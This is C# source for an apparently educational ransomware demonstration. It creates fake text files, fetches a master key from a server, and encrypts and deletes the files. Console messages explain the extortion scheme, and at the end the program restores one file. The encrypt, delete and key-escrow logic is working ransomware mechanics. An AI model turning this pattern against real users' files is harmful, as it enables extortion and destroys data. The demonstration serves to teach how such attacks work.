using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace CryptoTestTool
{
    class Program
    {
        static int Main(string[] args)
        {
            DirectoryInfo DI;
            //Ensure we are in the correct directory
            DI = new DirectoryInfo(Environment.CurrentDirectory = (new FileInfo(Process.GetCurrentProcess().MainModule.FileName)).Directory.FullName);

            ShowDisclaimer();
            WaitForKey();

            if (!File.Exists("Newtonsoft.Json.dll"))
            {
                SC((int)ConsoleColor.Red);
                Console.Error.WriteLine(@"Can't find 'Newtonsoft.Json.dll'.

This application consists of an .exe file and a .dll file. The DLL is missing.");
                WaitForKey();
                RC();
                return 1;
            }

            if (DI.GetFiles().Length > 2)
            {
                SC((int)ConsoleColor.Yellow);
                Console.Error.WriteLine(@"WARNING!

There are additional files in this directoy.
We recommend you don't do this.");
                WaitForKey();
                RC();
            }

            CreateTextFiles();
            Console.Error.WriteLine("We now have a few fake files to encrypt.");
            WaitForKey();

            ObtainMasterKey();
            Console.Error.WriteLine(@"We now have the master key to encrypt.
In reality this key would be hardcoded into the application,
this does not allows the key to be changed,
but also ensures the tool works without a network connection.
We only have the public part, this means we can encrypt but not decrypt.");
            WaitForKey();

            Cryptic C = CreateEncryptKey();
            Console.Error.WriteLine(@"Two additional files just appeared in the directory:

public.bin
This is the key we use to encrypt. We just generated it.

private.bin
This is the key we use to decrypt.
This was generated together with public.bin.
The difference here is that this file has been encrypted using the master key.
We essentially locked ourselves out of this file but that is the point.");
            WaitForKey();

            EncryptFiles(C);
            Console.Error.WriteLine(@"The files are gone.

So what happenend?
------------------
We used the temporary key we made (public.bin) to encrypt all the fake files
we created earlier and then deleted the original files.

To decrypt you would need private.bin but that file is unusable because it is
encrypted too.

How would you get your files back?
---------------------------------
We could now extort money for the fake files.
If you pay us and we verify the payment,
we would give you an E-mail address. You can then send private.bin to that
address. We decrypt it because we have the full master key and send you back
the private.bin file (decrypted). With that you can decrypt the files again.

Feel free to look at the encrypted files now.
If you continue we will decrypt the first one of them again.
This would normally not be possible but we never deleted the
unencrypted temporary key from memory as part of this demo.");
            WaitForKey();

            DecryptFirstFile(C);
            Console.Error.WriteLine("Document_0.txt is back. END OF DEMO");
            WaitForKey();


            return 0;
        }

        /// <summary>
        /// Shows the disclaimer.
        /// </summary>
        private static void ShowDisclaimer()
        {
            Console.Error.WriteLine(@"
THIS SOFTWARE IS PROVIDED 'AS IS' AND ANY EXPRESSED OR IMPLIED WARRANTIES,
INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR
BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER
IN CONTRACT, STRICT LIABILITY, OR TORT(INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.");
        }

        /// <summary>
        /// Decrypts the first encrypted file again as a proof of concept
        /// </summary>
        /// <param name="C">Crypto engine</param>
        private static void DecryptFirstFile(Cryptic C)
        {
            Console.Clear();
            Console.Error.Write("Decrypting first file...");
            if (File.Exists("Document_0.txt.crytest"))
            {
                File.WriteAllBytes("Docuemnt_0.txt", C.Decrypt(File.ReadAllBytes("Document_0.txt.crytest")));
            }
            else
            {
                SC((int)ConsoleColor.Red);
                Console.Error.WriteLine(@"[ERR]
The encrypted file was deleted already.");
                RC();
                return;
            }
            SC((int)ConsoleColor.Green);
            Console.Error.WriteLine("[DONE]");
            RC();
        }

        /// <summary>
        /// Encrypts the files generated
        /// </summary>
        /// <param name="C">Crypto engine</param>
        private static void EncryptFiles(Cryptic C)
        {
            Console.Clear();
            int i = 0;
            Console.Error.Write("Encrypting the fake documents we made earlier...");
            while (true)
            {
                var FN = $"Document_{i++}.txt";
                if (File.Exists(FN))
                {
                    File.WriteAllBytes($"{FN}.crytest", C.Crypt(File.ReadAllBytes(FN)));
                    File.Delete(FN);
                }
                else
                {
                    //We are done
                    break;
                }
            }

            SC((int)ConsoleColor.Green);
            Console.Error.WriteLine("[DONE]");
            RC();
        }

        /// <summary>
        /// Creates an encryption key and ensures we can't access the decryption key
        /// </summary>
        /// <returns>Crypto engine</returns>
        private static Cryptic CreateEncryptKey()
        {
            Console.Clear();
            Console.Error.Write("Create new encryption key...");
            Cryptic C = new Cryptic();
            C.CreateKey();
            //Export public as-is. You can't decrypt with this
            File.WriteAllBytes("public.bin", C.ExportKey(false));
            Cryptic Temp = new Cryptic();
            Temp.ImportKey(File.ReadAllBytes("master.bin"));
            //Export the private key encrypted. You can't decrypt with this either because the key itself is encrypted.
            File.WriteAllBytes("private.bin", Temp.Crypt(C.ExportKey(true)));
            SC((int)ConsoleColor.Green);
            Console.Error.WriteLine("[DONE]");
            RC();
            return C;
        }

        /// <summary>
        /// Downloads the master key.
        /// You can replace the content of this method with a hardcoded key if you want to.
        /// </summary>
        private static void ObtainMasterKey()
        {
            Console.Clear();
            Console.Error.Write("Obtaining master key...");
            using (WebClient WC = new WebClient())
            {
                try
                {
                    var Result = WC.DownloadString("https://master.ayra.ch/CryptoTest/?get=master").FromJson<ApiData>();
                    if (Result.Success)
                    {
                        File.WriteAllBytes("master.bin", Convert.FromBase64String((string)Result.Data));
                    }
                    else
                    {
                        throw new Exception($"Server request had an error: {Result.Message}");
                    }

                }
                catch(Exception ex)
                {
                    SC((int)ConsoleColor.Red);
                    Console.Error.WriteLine(@"[ERR]
Can't obtain master key.
Details: {0}", ex.Message);
                    WaitForKey();
                    RC();
                    Environment.Exit(1);
                }
            }
            SC((int)ConsoleColor.Green);
            Console.Error.WriteLine("[DONE]");
            RC();
        }

        /// <summary>
        /// Creates text files with random content
        /// </summary>
        /// <param name="Count">Number of files</param>
        /// <param name="Size">Size of files (in bytes)</param>
        private static void CreateTextFiles(int Count = 5, int Size = 5000)
        {
            const string ALPHA = "abcd efgh ijkl mnop qrst uvwx yz";
            Random R = new Random();
            Console.Clear();
            Console.Error.Write("Creating Text files to encrypt later...");
            for (var i = 0; i < Count; i++)
            {
                var FN = $"Document_{i}.txt";
                if (File.Exists(FN))
                {
                    File.Delete(FN);
                }
                using (var TW = File.CreateText(FN))
                {
                    for (var j = 0; j < Size; j++)
                    {
                        TW.Write(ALPHA[R.Next(ALPHA.Length)]);
                    }
                }
            }
            SC((int)ConsoleColor.Green);
            Console.Error.WriteLine("[DONE]");
            RC();

            Console.Error.WriteLine(@"You can now inspect the files if you want.
They only contain randomly generated nonsense.");
        }

        /// <summary>
        /// Set console color
        /// </summary>
        /// <param name="FGC">Font color</param>
        /// <param name="BGC">Background color</param>
        private static void SC(int FGC = -1, int BGC = -1)
        {
            if (Enum.IsDefined(typeof(ConsoleColor), FGC))
            {
                Console.ForegroundColor = (ConsoleColor)FGC;
            }
            if (Enum.IsDefined(typeof(ConsoleColor), BGC))
            {
                Console.BackgroundColor = (ConsoleColor)BGC;
            }
        }

        /// <summary>
        /// Resets console color
        /// </summary>
        private static void RC() => Console.ResetColor();

        /// <summary>
        /// Empties the keyboard buffer and waits for a key press
        /// </summary>
        /// <param name="ShowMessage">True to show a message to press a key</param>
        private static void WaitForKey(bool ShowMessage = true)
        {
            if (ShowMessage)
            {
                Console.Error.WriteLine("Press any key to continue...");
            }
            do
            {
                Console.ReadKey(true);
            } while (Console.KeyAvailable);
        }
    }
}
